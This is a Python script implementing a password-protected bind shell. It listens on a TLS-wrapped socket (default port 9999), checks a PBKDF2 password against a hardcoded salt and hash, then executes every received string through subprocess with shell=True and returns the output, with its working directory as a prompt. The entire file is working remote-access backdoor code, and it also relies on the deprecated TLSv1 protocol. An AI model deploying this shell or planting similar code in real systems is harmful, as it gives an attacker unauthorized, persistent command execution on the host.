#!/usr/bin/env python3

import socket
import os
import subprocess
import sys
import ssl
from sys import exit
import hashlib
import hmac


def is_correct_password(salt: bytes, pw_hash: bytes, password: str) -> bool:
    """
    Given a previously-stored salt and hash, and a password provided by a user
    trying to log in, check whether the password is correct.
    """
    return hmac.compare_digest(
        pw_hash,
        hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
    )


# Run gen_shell_pw.py to generate your hash and salt
pw_hash = 'a0e72e299310c2cbc21d7902310264711903d4208be48b49de48bf9195201b9e'
salt = 'e7eff0d7d3e81969e10646f04d5df869'
debug = True


def main():
    global client
    #  global sock
    try:
        try:
            port = int(sys.argv[2])
        except:
            port = 9999
        try:
            ip = sys.argv[1]
        except:
            ip = "127.0.0.1"

        host = (ip, port)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock = ssl.wrap_socket(s, certfile='../ssl/server.crt', keyfile='../ssl/server.key',
                               ssl_version=ssl.PROTOCOL_TLSv1)

        try:
            sock.bind(host)
        except OSError:
            print('Address in use!')
            return False
        else:
            sock.listen(1)

        while True:
            client, address = sock.accept()
            if debug:
                print(f'Accepted connected from {address[0]}:{address[1]}')
            while True:
                client.send(str.encode('nope'))
                pw = client.recv(1024)[:].decode('utf-8').rstrip('\n')
                if is_correct_password(bytes.fromhex(salt), bytes.fromhex(pw_hash), pw):
                    authenticated = True
                    break
                else:
                    client.send(str.encode('bruh\n'))
            if authenticated:
                prompt = os.getcwd() + "> "
                client.send(prompt.encode())
                while True:
                    cmd = client.recv(1024)
                    if debug:
                        print(cmd.decode('utf-8'))
                    if cmd.decode('utf-8').rstrip('\n') == '__quit__':
                        client.close()
                        exit(1)

                    ter = subprocess.Popen(cmd.decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    res = ""
                    output_bytes = ter.stdout.read() + ter.stderr.read()
                    output_str = output_bytes.decode('utf-8')
                    for line in output_str:
                        res += line
                    ret = res + os.getcwd() + "> "
                    client.send(ret.encode())

    except KeyboardInterrupt:
        try:
            client.send(b"\n\nConnection closed... Goodbye...\n")
        except Exception:
            client.close()
    except socket.error:
        client.close()


if __name__ == "__main__":
    main()
